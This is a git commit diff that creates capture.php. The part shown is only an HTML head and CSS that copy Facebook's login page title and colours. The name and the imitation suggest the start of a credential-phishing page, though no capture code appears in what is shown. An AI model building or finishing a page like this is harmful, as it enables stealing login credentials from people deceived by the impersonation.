07252bff13c42bce962a61aeec057b7965508816
Levon2000 <studyhard1588@gmail.com>
2025-03-18 23:00:12 +0400

    Create capture.php

---
+++ capture.php
@@ -0,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In or Sign Up</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      line-height: 1.5;
+    }
